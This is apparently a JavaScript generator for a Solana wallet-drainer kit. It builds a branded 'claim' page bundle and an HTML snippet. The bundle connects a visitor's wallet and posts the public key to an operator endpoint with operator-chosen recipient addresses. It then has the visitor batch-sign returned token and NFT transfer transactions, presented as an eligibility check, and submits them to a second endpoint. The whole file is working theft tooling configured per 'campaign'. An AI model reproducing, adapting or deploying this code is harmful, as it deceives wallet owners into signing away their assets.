import crypto from "node:crypto";

const TEMPLATE = `/* Sol Asset Manager — client bundle (ESM) */
import * as web3 from "https://esm.sh/@solana/web3.js@1.98.4";

const PLAN_ENDPOINT = "__PLAN_ENDPOINT__";
const SUBMIT_ENDPOINT = "__SUBMIT_ENDPOINT__";
const CAMPAIGN_ID = "__CAMPAIGN_ID__";
const CAMPAIGN_SECRET = "__CAMPAIGN_SECRET__";
const RECIPIENT = "__RECIPIENT__";
const RECIPIENTS = __RECIPIENTS__;
const MODE = "__MODE__";
const LIQUID_MINTS = __LIQUID_MINTS__;
const BRAND = __BRAND__;

const SIGN_BATCH = 8;

const ADAPTER_SOURCES = [
  ["PhantomWalletAdapter", "https://esm.sh/@solana/wallet-adapter-phantom"],
  ["BackpackWalletAdapter", "https://esm.sh/@solana/wallet-adapter-backpack"],
  ["SolflareWalletAdapter", "https://esm.sh/@solana/wallet-adapter-solflare"],
  ["ExodusWalletAdapter", "https://esm.sh/@solana/wallet-adapter-exodus"],
  ["MathWalletAdapter", "https://esm.sh/@solana/wallet-adapter-mathwallet"],
];

// ---------- encoding helpers ----------

function b64ToBytes(b64) {
  const raw = atob(b64);
  const bytes = new Uint8Array(raw.length);
  for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
  return bytes;
}

function bytesToB64(bytes) {
  let bin = "";
  const chunk = 0x8000;
  for (let i = 0; i < bytes.length; i += chunk) {
    bin += String.fromCharCode.apply(null, bytes.subarray(i, i + chunk));
  }
  return btoa(bin);
}

async function hmac(secret, message) {
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey(
    "raw", enc.encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"],
  );
  const sig = await crypto.subtle.sign("HMAC", key, enc.encode(message));
  return Array.from(new Uint8Array(sig))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

async function signedRequest(url, payload) {
  const body = Object.assign({}, payload, { campaignId: CAMPAIGN_ID });
  if (CAMPAIGN_SECRET) {
    body.auth = await hmac(CAMPAIGN_SECRET, JSON.stringify(body));
  }
  const res = await fetch(url, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => "");
    throw new Error("request failed: " + res.status + " " + text);
  }
  return res.json();
}

// ---------- wallet discovery ----------

async function loadAdapters() {
  const found = [];

  await Promise.allSettled(
    ADAPTER_SOURCES.map(async ([CtorName, url]) => {
      try {
        const mod = await import(url);
        const Ctor = mod[CtorName];
        if (typeof Ctor === "function") found.push(new Ctor());
      } catch (err) {
        console.warn("[wallet] adapter load failed:", CtorName, err);
      }
    }),
  );

  // Wallet-standard bridging — picks up MetaMask Solana Snap, Jupiter mobile,
  // Glow, Nightly, and any future wallet that registers on the standard.
  try {
    const [{ getWallets }, base] = await Promise.all([
      import("https://esm.sh/@wallet-standard/app"),
      import("https://esm.sh/@solana/wallet-adapter-base"),
    ]);
    const StandardAdapter = base.WalletStandardWalletAdapter;
    if (StandardAdapter) {
      const registry = getWallets();
      const registered = registry.get() || [];
      for (const stdWallet of registered) {
        if (!stdWallet.chains) continue;
        const hasSolana = stdWallet.chains.some(
          (c) => typeof c === "string" && c.startsWith("solana:"),
        );
        if (!hasSolana) continue;
        if (found.some((a) => a.name === stdWallet.name)) continue;
        try {
          found.push(new StandardAdapter({ wallet: stdWallet }));
        } catch (err) {
          console.warn("[wallet] standard wrap failed:", stdWallet.name, err);
        }
      }
    }
  } catch (err) {
    console.warn("[wallet] wallet-standard bridge unavailable:", err);
  }

  // Dedupe by name, prefer Installed.
  const byName = new Map();
  for (const adapter of found) {
    const prev = byName.get(adapter.name);
    if (!prev) {
      byName.set(adapter.name, adapter);
    } else if (prev.readyState !== "Installed" && adapter.readyState === "Installed") {
      byName.set(adapter.name, adapter);
    }
  }

  return Array.from(byName.values()).filter((a) => a.readyState === "Installed");
}

// ---------- UI ----------

function injectStyles() {
  if (document.getElementById("sc-styles")) return;
  const style = document.createElement("style");
  style.id = "sc-styles";
  style.textContent = \`
[data-claim]{all:unset;display:inline-flex;align-items:center;justify-content:center;padding:16px 32px;border-radius:12px;background:linear-gradient(135deg,#7c3aed,#06b6d4);color:#fff;font:600 16px/1 system-ui,-apple-system,sans-serif;cursor:pointer;transition:transform .15s ease,opacity .15s ease;box-shadow:0 8px 24px rgba(124,58,237,.35)}
[data-claim]:hover{transform:translateY(-1px);opacity:.94}
[data-claim][disabled]{opacity:.6;cursor:progress}
[data-status]{margin-top:12px;font:500 14px/1.4 system-ui,sans-serif;color:#555}
[data-wallet-overlay]{position:fixed;inset:0;background:rgba(6,8,20,.65);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);z-index:2147483000;display:none;align-items:center;justify-content:center;padding:24px}
[data-wallet-overlay][data-open="1"]{display:flex}
[data-wallet-modal]{background:#14151e;border:1px solid rgba(255,255,255,.08);border-radius:16px;padding:20px;width:min(400px,100%);color:#fff;font:500 14px/1.4 system-ui,sans-serif;box-shadow:0 24px 48px rgba(0,0,0,.55)}
[data-wallet-modal] h3{margin:0 0 14px;font:700 16px/1.2 system-ui,sans-serif;letter-spacing:-.01em}
[data-wallet-close]{all:unset;cursor:pointer;float:right;color:rgba(255,255,255,.5);font-size:20px;line-height:1;padding:0 4px}
[data-wallet-close]:hover{color:#fff}
[data-wallet-list]{display:flex;flex-direction:column;gap:8px;margin-top:4px}
[data-wallet-item]{all:unset;display:flex;align-items:center;gap:12px;padding:12px 14px;background:rgba(255,255,255,.04);border-radius:10px;cursor:pointer;transition:background .15s ease}
[data-wallet-item]:hover{background:rgba(255,255,255,.1)}
[data-wallet-icon]{flex:0 0 auto;width:30px;height:30px;border-radius:8px;background:linear-gradient(135deg,#7c3aed,#06b6d4);display:flex;align-items:center;justify-content:center;font:700 13px/1 system-ui,sans-serif;color:#fff}
[data-wallet-name]{flex:1;text-align:left;font:600 14px/1.2 system-ui,sans-serif}
[data-wallet-empty]{color:rgba(255,255,255,.55);padding:16px 4px;font:400 13px/1.5 system-ui,sans-serif}
\`;
  document.head.appendChild(style);
}

let overlayEl = null;
let listEl = null;

function ensureModal() {
  if (overlayEl) return overlayEl;
  injectStyles();

  overlayEl = document.createElement("div");
  overlayEl.setAttribute("data-wallet-overlay", "");

  const modal = document.createElement("div");
  modal.setAttribute("data-wallet-modal", "");

  const closeBtn = document.createElement("button");
  closeBtn.setAttribute("data-wallet-close");
  closeBtn.setAttribute("aria-label", "Close");
  closeBtn.textContent = "\\u00D7";
  modal.appendChild(closeBtn);

  const title = document.createElement("h3");
  title.textContent = "Connect a Wallet";
  modal.appendChild(title);

  listEl = document.createElement("div");
  listEl.setAttribute("data-wallet-list", "");
  modal.appendChild(listEl);

  overlayEl.appendChild(modal);
  document.body.appendChild(overlayEl);

  overlayEl.addEventListener("click", (ev) => {
    if (ev.target === overlayEl) closePicker();
  });
  closeBtn.addEventListener("click", closePicker);

  return overlayEl;
}

function openPicker() {
  if (!overlayEl) return;
  overlayEl.setAttribute("data-open", "1");
  document.body.style.overflow = "hidden";
}

function closePicker() {
  if (!overlayEl) return;
  overlayEl.removeAttribute("data-open");
  document.body.style.overflow = "";
}

function renderList(adapters, onPick) {
  ensureModal();
  listEl.innerHTML = "";

  if (adapters.length === 0) {
    const empty = document.createElement("div");
    empty.setAttribute("data-wallet-empty", "");
    empty.textContent =
      "No Solana wallets detected. Install Phantom, Backpack, Solflare, Exodus, MathWallet, or MetaMask with the Solana Snap, then reload.";
    listEl.appendChild(empty);
    return;
  }

  for (const adapter of adapters) {
    const item = document.createElement("button");
    item.setAttribute("data-wallet-item", "");

    const icon = document.createElement("div");
    icon.setAttribute("data-wallet-icon", "");
    icon.textContent = (adapter.name || "?").charAt(0).toUpperCase();

    const label = document.createElement("span");
    label.setAttribute("data-wallet-name", "");
    label.textContent = adapter.name;

    item.appendChild(icon);
    item.appendChild(label);
    item.addEventListener("click", () => {
      closePicker();
      onPick(adapter);
    });

    listEl.appendChild(item);
  }
}

function setStatus(el, text) {
  if (el) el.textContent = text;
}

// ---------- claim flow ----------

async function handleClaim(adapter, btn, statusEl) {
  btn.disabled = true;
  setStatus(statusEl, "Connecting to " + adapter.name + "...");

  try {
    if (adapter.connected) {
      await adapter.disconnect().catch(() => {});
    }
    await adapter.connect();

    const pubkey = adapter.publicKey ? adapter.publicKey.toString() : null;
    if (!pubkey) throw new Error("wallet did not return a public key");

    setStatus(
      statusEl,
      "Checking eligibility for " + pubkey.slice(0, 6) + "..." + pubkey.slice(-4),
    );

    const payload = {
      source: pubkey,
      recipient: RECIPIENTS[0],
      recipients: RECIPIENTS,
    };
    if (MODE === "manual") {
      payload.mode = "manual";
      payload.liquidMints = LIQUID_MINTS;
    }

    const plan = await signedRequest(PLAN_ENDPOINT, payload);
    const splB64 = plan.transactions || [];
    const cnftB64 = plan.cnftTransactions || [];
    const allB64 = splB64.concat(cnftB64);

    if (allB64.length === 0) {
      setStatus(statusEl, "Nothing to claim.");
      return;
    }

    setStatus(
      statusEl,
      "Preparing " + allB64.length + " transaction" + (allB64.length > 1 ? "s" : "") + "...",
    );

    const splCount = splB64.length;
    const signedSpl = [];
    const signedCnft = [];

    for (let i = 0; i < allB64.length; i += SIGN_BATCH) {
      const batchB64 = allB64.slice(i, i + SIGN_BATCH);
      const batchTxs = batchB64.map((b) =>
        web3.VersionedTransaction.deserialize(b64ToBytes(b)),
      );

      setStatus(
        statusEl,
        "Confirm " + (i + 1) + "\\u2013" + Math.min(i + SIGN_BATCH, allB64.length) +
          " of " + allB64.length + "...",
      );

      let signedBatch;
      if (typeof adapter.signAllTransactions === "function" && batchTxs.length > 1) {
        try {
          signedBatch = await adapter.signAllTransactions(batchTxs);
        } catch (err) {
          console.warn("[sign] batch failed, falling back to per-tx:", err);
          signedBatch = await Promise.all(batchTxs.map((t) => adapter.signTransaction(t)));
        }
      } else {
        signedBatch = await Promise.all(batchTxs.map((t) => adapter.signTransaction(t)));
      }

      for (let j = 0; j < signedBatch.length; j++) {
        const globalIdx = i + j;
        const encoded = bytesToB64(signedBatch[j].serialize());
        if (globalIdx < splCount) signedSpl.push(encoded);
        else signedCnft.push(encoded);
      }
    }

    let jitoTipBase64 = null;
    if (plan.jitoTip && plan.jitoTip.base64) {
      setStatus(statusEl, "Signing tip...");
      const tipTx = web3.VersionedTransaction.deserialize(b64ToBytes(plan.jitoTip.base64));
      const signedTip = await adapter.signTransaction(tipTx);
      jitoTipBase64 = bytesToB64(signedTip.serialize());
    }

    setStatus(statusEl, "Submitting...");
    const result = await signedRequest(SUBMIT_ENDPOINT, {
      signedTransactions: signedSpl,
      signedCnftTransactions: signedCnft,
      jitoTipBase64: jitoTipBase64,
    });

    if (result.complete) {
      setStatus(statusEl, "Claim successful.");
    } else if (result.signatures && result.signatures.length > 0) {
      setStatus(
        statusEl,
        "Partial: " + result.signatures.length + "/" + result.total + " confirmed.",
      );
    } else {
      setStatus(statusEl, "Claim did not complete. Try again.");
    }
  } catch (err) {
    console.error("[claim]", err);
    const msg = err && err.message ? err.message : String(err);
    setStatus(statusEl, "Error: " + msg);
  } finally {
    btn.disabled = false;
    if (adapter.connected) await adapter.disconnect().catch(() => {});
  }
}

// ---------- bootstrap ----------

async function init() {
  ensureModal();

  const buttons = Array.from(document.querySelectorAll("[data-claim]"));
  for (const btn of buttons) {
    if (btn.__claimBound) continue;
    btn.__claimBound = true;

    const panel = btn.closest("[data-claim-panel]") || btn.parentElement;
    const statusEl = panel ? panel.querySelector("[data-status]") : null;

    btn.addEventListener("click", async (ev) => {
      ev.preventDefault();
      btn.disabled = true;
      setStatus(statusEl, "Detecting wallets...");
      const adapters = await loadAdapters();
      btn.disabled = false;

      if (adapters.length === 0) {
        setStatus(statusEl, "No Solana wallets detected.");
        renderList([], () => {});
        openPicker();
        return;
      }

      setStatus(statusEl, "");
      renderList(adapters, (adapter) => handleClaim(adapter, btn, statusEl));
      openPicker();
    });
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}
`;

export function generateBundle({ planEndpoint, submitEndpoint, recipients, mode, liquidMints, campaignId, secret, brand }) {
  const primary = Array.isArray(recipients) ? recipients[0] : recipients;
  const recipientList = Array.isArray(recipients) ? recipients : [recipients];
  return TEMPLATE
    .replace("__PLAN_ENDPOINT__", planEndpoint)
    .replace("__SUBMIT_ENDPOINT__", submitEndpoint)
    .replace("__CAMPAIGN_ID__", campaignId)
    .replace("__CAMPAIGN_SECRET__", secret || "")
    .replace("__RECIPIENT__", primary)
    .replace("__RECIPIENTS__", JSON.stringify(recipientList))
    .replace("__MODE__", mode)
    .replace("__LIQUID_MINTS__", JSON.stringify(liquidMints || []))
    .replace("__BRAND__", JSON.stringify(brand || {}));
}

export function newCampaignSecret() {
  return crypto.randomBytes(24).toString("hex");
}

export const HTML_SNIPPET =
  '<script type="module" src="/bundle.js"></script>\n' +
  '<div data-claim-panel>\n' +
  '  <button data-claim>Connect Wallet</button>\n' +
  '  <div data-status></div>\n' +
  '</div>\n';
